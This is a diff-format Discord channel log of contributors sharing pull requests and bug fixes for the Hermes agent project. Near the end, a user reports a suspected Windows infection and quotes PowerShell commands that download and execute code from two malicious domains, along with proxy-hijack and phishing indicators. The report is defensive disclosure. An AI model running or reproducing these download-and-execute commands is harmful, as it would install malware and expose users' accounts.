@@ -28233,3 +28233,268 @@ An under... https://www.linkedin.com/posts/sydney-runkle_deepagents-now-supports
     merged now
     [reply to hughjm msg=1513722217530265680]
 
+[2026-06-09T09:40:09.378000+00:00] gordon4512 (id=1513840115724845056)
+    Hi, is this the right place to discuss pull request for features and bug fixes and what an optimal fix for a particular bug might be?
+
+[2026-06-09T09:40:19.444000+00:00] kxee (id=1513840157944578109)
+    yes
+    [reply to gordon4512 msg=1513840115724845056]
+
+[2026-06-09T09:40:50.013000+00:00] hughjm (id=1513840286160257114)
+    Thanks！
+    [reply to kxee msg=1513839765068451921]
+
+[2026-06-09T09:43:45.923000+00:00] gordon4512 (id=1513841023980146758)
+    Cool, OK, so I have this PR open to extend the `[SILENT]` feature from just crons to all chats (so the model can actively chose to not respond when it has nothing meaningful to contribute):
+    https://github.com/NousResearch/hermes-agent/pull/32879/
+    I have it in a state where "it works for me" and have been using it for a week or two, but wanted to follow up on whether this feature is considered useful for others. Obviously I would prefer to not have to maintain my own fork but some clarity on whether this would ever be considered for upstreaming is more important.
+    [embed] [Feature]: Allow agent response opt out by gordan-bobic · Pull Req... https://github.com/NousResearch/hermes-agent/pull/32879/
+
+[2026-06-09T09:46:25.999000+00:00] teknium (id=1513841695387680931)
+    merged
+    [reply to gumandnuts msg=1513807274500558858]
+
+[2026-06-09T10:38:08.915000+00:00] nanxingncb612d (id=1513854709960802446)
+    https://github.com/NousResearch/hermes-agent/pull/42775 Windows - resolve compatibility, path resolution, and encoding issues
+    [embed] fix(windows): resolve compatibility, path resolution, and encoding ... https://github.com/NousResearch/hermes-agent/pull/42775
+
+[2026-06-09T10:44:54.610000+00:00] godsboy7777 (id=1513856411568963645)
+    <@387972437901312000>, quick one for review please:
+    
+    I opened a fix for a Telegram gateway streaming bug where long topic replies could look like they stopped mid-answer after hitting Telegram's 4096 UTF-16 message limit.
+    
+    Issue:
+    https://github.com/NousResearch/hermes-agent/issues/42765
+    
+    PR:
+    https://github.com/NousResearch/hermes-agent/pull/42766
+    
+    Short version
+    
+    - Telegram streamed edits split long replies into overflow chunks.
+    - If chunk 1 landed but a later continuation failed, Hermes could still treat the final response as delivered.
+    - Result: the user saw a clipped answer in the topic, with no recovery tail.
+    - This PR makes partial overflow delivery explicit.
+    - The stream consumer then sends the missing tail instead of marking the response complete.
+    - It also avoids deleting the already-visible prefix when doing the tail fallback.
+    
+    Validation
+    
+    - Local targeted gateway tests passed
+    - Ruff passed
+    - Full PR CI is green
+    
+    Main files
+    
+    - "gateway/platforms/telegram.py"
+    - "gateway/stream_consumer.py"
+    - "tests/gateway/test_telegram_overflow_partial.py"
+    
+    Would appreciate your review when you get a gap.
+    [attachment] topic-final-response-clipped.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1513856411690602619/topic-final-response-clipped.jpg?ex=6a294026&is=6a27eea6&hm=b358329b7a7b0ddd227e16e2e6abd4a87331004aee0d8d182a018aac9ca93e19&
+    [embed] [Bug]: Telegram topic streamed reply can stop after first overflow ... https://github.com/NousResearch/hermes-agent/issues/42765
+    [embed] fix(gateway): recover partial Telegram overflow streams by GodsBoy ... https://github.com/NousResearch/hermes-agent/pull/42766
+
+[2026-06-09T11:01:01.513000+00:00] kyssta69 (id=1513860467053826189)
+    https://github.com/NousResearch/hermes-agent/pull/42789
+    
+    **Problem**: Gateway does not auto-start after container restart or image upgrade because SIGTERM from Docker persists gateway_state=stopped.
+    The signal handler unconditionally writes gateway_state=stopped via _update_runtime_status, and container_boot.py refuses to auto-start when state is not running.
+    Skip persisting stopped state on signal-initiated shutdown so the running state survives for container_boot to auto-start on next boot.
+    [embed] fix(gateway): skip persisting gateway_state=stopped on signal-initi... https://github.com/NousResearch/hermes-agent/pull/42789
+
+[2026-06-09T11:04:28.222000+00:00] kyssta69 (id=1513861334054469793)
+    https://github.com/NousResearch/hermes-agent/pull/42791
+    
+    **Problem**: TERMINAL_DOCKER_VOLUMES set to non-JSON value like None crashes all subprocess tools with ValueError.
+    Docker env vars are parsed eagerly with json.loads regardless of terminal.backend, so a bad value kills the agent even with local backend.
+    Use a safe JSON converter that falls back to the default on parse errors instead of crashing.
+    [embed] fix(terminal): use safe JSON parser for docker env vars (#42725) by... https://github.com/NousResearch/hermes-agent/pull/42791
+
+[2026-06-09T11:08:05.730000+00:00] kyssta69 (id=1513862246348881930)
+    https://github.com/NousResearch/hermes-agent/pull/42795
+    
+    **Problem**: Curator-archived bundled skills are incorrectly flagged as user-modified, blocking updates.
+    The sync code only checked user_hash != origin_hash but not whether user_hash == bundled_hash, so stale manifest entries caused false user-modified flags.
+    When user copy matches current bundled version, re-baseline the manifest instead of flagging as user-modified.
+    [embed] fix(skills): re-baseline manifest when user copy matches bundled (#... https://github.com/NousResearch/hermes-agent/pull/42795
+
+[2026-06-09T11:09:00.871000+00:00] bily0122 (id=1513862477627134032)
+    I submitted a bug, which I think is very serious, and has appeared in versions 0.15 and 0.16. I hope it can be solved in the next version, and I think this problem will be encountered by many people who may use local models. I think it should be like this
+    https://github.com/NousResearch/hermes-agent/issues/41490
+    [embed] [Bug]: Agent loops on identical tool calls despite being blocked ... https://github.com/NousResearch/hermes-agent/issues/41490
+
+[2026-06-09T11:09:50.245000+00:00] kyssta69 (id=1513862684716695663)
+    https://github.com/NousResearch/hermes-agent/pull/42796
+    
+    **Problem**: macOS launchd gateway crashes on restart with PermissionError on gateway.lock.
+    launchd Background sessions spawn as root, creating root-owned lock files that the user process cannot open on restart.
+    Add UserName key to the launchd plist to ensure the gateway always runs as the logged-in user.
+    [embed] fix(gateway): add UserName to launchd plist to prevent crash loop (... https://github.com/NousResearch/hermes-agent/pull/42796
+
+[2026-06-09T11:12:21.624000+00:00] kyssta69 (id=1513863319646240900)
+    https://github.com/NousResearch/hermes-agent/pull/42797
+    
+    **Problem**: MCP tools are not discovered in Desktop/Dashboard mode, making them invisible in sessions.
+    The start_server() function bypasses the gateway/CLI startup paths that call start_background_mcp_discovery().
+    Add start_background_mcp_discovery() call to start_server() before uvicorn.run().
+    [embed] fix(dashboard): start MCP discovery thread in Dashboard mode (#4269... https://github.com/NousResearch/hermes-agent/pull/42797
+
+[2026-06-09T11:14:17.478000+00:00] gordon4512 (id=1513863805573005312)
+    I just raised this PR to fix a compaction leak into chat:
+    https://github.com/NousResearch/hermes-agent/pull/42783/
+    The problem seems to arise when more or less by change the compaction output lands on alternating `role="assistant"`.
+    There are two possible fixes I considered:
+    1) Fixing the assistant case
+    2) Forcing role="user" on the compacted summary
+    
+    Option 2) is cleaner and has the added advantage for LLMs that weigh messages from `role="user"` higher than `role="assistant"`.
+    I'm very open to input from people with better understanding of how everything else hangs together. Is this the correct fix or is there a better alternative?
+    [embed] Fix memory compaction leak when role=assistant by gordan-bobic · P... https://github.com/NousResearch/hermes-agent/pull/42783/
+
+[2026-06-09T12:27:53.361000+00:00] theoveo (id=1513882327128735824)
+    Hey folks 👋
+    
+    We’ve been heavily dogfooding Hermes in a real Docker / Discord / WSL setup, and opened several upstream PRs based on issues we hit in production-like usage.
+    
+    I cleaned everything up to make review easier:
+    
+    * all open PR branches are rebased on latest `origin/main`
+    * previous conflicts are resolved
+    * all 8 PRs are merge-clean
+    * all GitHub checks are green
+    
+    I don’t want to spam maintainers or ask for everything to be merged at once. I’d rather align with what’s most useful for the project.
+    
+    Suggested priority: desktop/sidebar first:
+    
+    1. #42140 — Fix All profiles desktop session grouping
+       https://github.com/NousResearch/hermes-agent/pull/42140
+       Small bugfix, merge-clean, CI green. Fixes session grouping by profile/source.
+    
+    2. #42061 — Polish French dashboard/sidebar copy
+       https://github.com/NousResearch/hermes-agent/pull/42061
+       Small desktop/sidebar/i18n cleanup, merge-clean, CI green.
+    [embed] fix: group all-profile desktop sessions by profile by leprincep3570... https://github.com/NousResearch/hermes-agent/pull/42140
+    [embed] fix: polish French dashboard sidebar copy by leprincep35700 · Pull... https://github.com/NousResearch/hermes-agent/pull/42061
+
+[2026-06-09T12:27:57.050000+00:00] theoveo (id=1513882342601785515)
+    If runtime/gateway fixes are more useful, these are also clean and green:
+    
+    3. #32430 — Fix gateway plugin discovery before adapter creation
+       https://github.com/NousResearch/hermes-agent/pull/32430
+       P2 bug, merge-clean, CI green.
+    
+    4. #34464 — Fix gateway update/systemd restart handoff
+       https://github.com/NousResearch/hermes-agent/pull/34464
+       P2 bug, merge-clean, CI green. Came from real update/restart issues in our deployment.
+    
+    Other clean PRs, lower priority from my perspective:
+    
+    * #20354 — Cron scripts receive configured arguments
+      https://github.com/NousResearch/hermes-agent/pull/20354
+    
+    * #24271 — Opt-in gateway startup/home-channel notification
+      https://github.com/NousResearch/hermes-agent/pull/24271
+    
+    * #22816 — Optional read-only Privy wallet skill
+      https://github.com/NousResearch/hermes-agent/pull/22816
+    
+    * #20073 — Anthropic Workload Identity Federation auth
+      https://github.com/NousResearch/hermes-agent/pull/20073
+      Larger auth/provider work, so I’d understand if it needs separate design review or should wait.
+    
+    Happy to adapt if maintainers prefer a different order, or want any PR reduced, closed, or reworked. We’re using Hermes a lot and want to contribute where it’s most useful upstream.
+    [embed] fix(gateway): force plugin discovery before adapter creation by lep... https://github.com/NousResearch/hermes-agent/pull/32430
+    [embed] fix(gateway): refresh systemd units before update restart by leprin... https://github.com/NousResearch/hermes-agent/pull/34464
+    [embed] fix(cron): pass arguments to job scripts by leprincep35700 · Pull ... https://github.com/NousResearch/hermes-agent/pull/20354
+    [embed] feat(gateway): add opt-in startup online notification by leprincep3... https://github.com/NousResearch/hermes-agent/pull/24271
+    [embed] feat(skills): add read-only Privy wallet skill by leprincep35700 ·... https://github.com/NousResearch/hermes-agent/pull/22816
+
+[2026-06-09T12:33:00.071000+00:00] godsboy7777 (id=1513883613563715665)
+    Hey <@387972437901312000>, gentle follow-up on the Brave Search API PR now that Computex has passed:
+    
+    https://github.com/NousResearch/hermes-agent/pull/26286
+    
+    The PR is still green, additive, and keeps the existing `brave-free` path untouched. The main value is adding support for the paid Brave API modes that do not fit neatly into normal `web_search`, like LLM context, images, news, videos, discussions, suggestions, and bounded raw output.
+    
+    It also includes the provider plugin under `plugins/web/brave_search`, so it is not trying to replace the existing Brave support.
+    
+    Would you mind giving it another look when you have a gap? If the top-level `brave_search` tool feels too much for one PR, I’m happy to split it and land the provider plugin first.
+    [embed] feat(web): add Brave Search API rich modes by GodsBoy · Pull Reque... https://github.com/NousResearch/hermes-agent/pull/26286
+    [reply to teknium msg=1509965750708867133]
+
+[2026-06-09T12:54:42.772000+00:00] kyssta69 (id=1513889077487997049)
+    https://github.com/NousResearch/hermes-agent/pull/42841
+    
+    **Problem**: In TUI slash-worker, /usage showed 'No active agent' even after chatting with a live session. The HermesCLI slash worker has no live agent instance, so _show_usage() returned early. Now reads persisted token counts from state.db via SessionDB so users see their session usage.
+    [embed] fix(cli): /usage shows persisted session data when no live agent (#... https://github.com/NousResearch/hermes-agent/pull/42841
+
+[2026-06-09T13:48:12.776000+00:00] blockcipher (id=1513902541220610190)
+    [bugfix: high CPU usage in Hermes Desktop](https://github.com/NousResearch/hermes-agent/pull/42866)
+    
+    Disabled desktop panes can still mount React components, which can sometimes cause spammy calls to `requestAnimationFrame`
+    [embed] fix(desktop): unmount disabled pane contents by counterposition · ... https://github.com/NousResearch/hermes-agent/pull/42866
+
+[2026-06-09T13:49:53.406000+00:00] ilmarselter (id=1513902963293163652)
+    Subject: Security incident after Hermes Desktop update on Windows 11: localhost proxy hijack and fake Google SMS verification
+    
+    Important context:
+    - The issue appeared after installing/updating the Hermes Desktop app.
+    
+    Observed symptoms:
+    - Chrome and Edge were both forced to a fake Google “SMS Verification” page.
+    - The page appeared even when opening real-looking Google/Gmail URLs such as `https://gmail.com` and `mail.google.com`.
+    - The SMS code arriving on my phone was for Wise, not Google, suggesting phishing or account-abuse behavior.
+    - I did not enter the code.
+    - Hermes Desktop stopped opening and did not appear in the normal Windows uninstall list.
+    
+    Technical findings:
+    - Windows user proxy settings were repeatedly changed to localhost proxies:
+      - `127.0.0.1:54556`
+      - later `127.0.0.1:63706`
+      - later `127.0.0.1:61946`
+      - later `127.0.0.1:51858`
+    - These proxies were used by both Chrome and Edge.
+    - A suspicious scheduled task was found and removed:
+      - `\MicrosoftSoftwareHealthCheckerLegacy`
+    - The task launched PowerShell with remote code execution:
+      - `powershell.exe -NoProfile -Command iex (iwr -useb quorivaspaces.info)`
+      - later also observed:
+      - `powershell.exe -NoProfile -Command iex (iwr -useb pinkxeltriva.com)`
+    - That PowerShell process spawned:
+      - `C:\WINDOWS\system32\MicrosoftSoftwareHealthCheckerLegacy\node.exe .\app.js`
+    - The folder contained a bundled Node runtime and app files, including:
+      - `node.exe`
+      - `app.js`
+      - `preload.js`
+      - multiple `.node` binaries
+      - `build.zip`
+      - a `db` directory
+    
+    Indicators of compromise:
+    - Domains:
+      - `quorivaspaces.info`
+      - `pinkxeltriva.com`
+    - File path:
+      - `C:\WINDOWS\system32\MicrosoftSoftwareHealthCheckerLegacy\`
+    - Scheduled task:
+      - `MicrosoftSoftwareHealthCheckerLegacy`
+    - Behavior:
+      - Forced Windows proxy to localhost
+      - Intercepted browser traffic
+      - Displayed fake Google SMS verification flow
+      - Triggered SMS activity related to Wise
+    [attachment] phishing.jpg https://cdn.discordapp.com/attachments/1491258766648283238/1513902963226181663/phishing.jpg?ex=6a296b81&is=6a281a01&hm=d1591d9ffacff707f0f333eaa85aa32767145d5ef50e7880a517c465ad2b403c&
+
+[2026-06-09T13:51:51.973000+00:00] ilmarselter (id=1513903460599206069)
+    [attachment] image.png https://cdn.discordapp.com/attachments/1491258766648283238/1513903460276371616/image.png?ex=6a296bf7&is=6a281a77&hm=a865f9b6d53db34aa62a8c677f1c29976ea329794f3af64cb11c3818ae68c051&
+    [reply to ilmarselter msg=1513902963293163652]
+
+[2026-06-09T13:56:46.878000+00:00] ilmarselter (id=1513904697520685096)
+    [attachment] image.png https://cdn.discordapp.com/attachments/1491258766648283238/1513904697214369892/image.png?ex=6a296d1e&is=6a281b9e&hm=5b717bbba31fdd0f82f88d5c9e64cf9b47df05b1d352fcf170582028e8d56b8a&
+    [reply to ilmarselter msg=1513903460599206069]
+
+[2026-06-09T14:10:19.555000+00:00] emanuel_build (id=1513908106134814930)
+    Where can I discuss the architecture of the Hermes Agent? Is it in this channel, or is there a more specific channel to talk with the Hermes engineers?
+
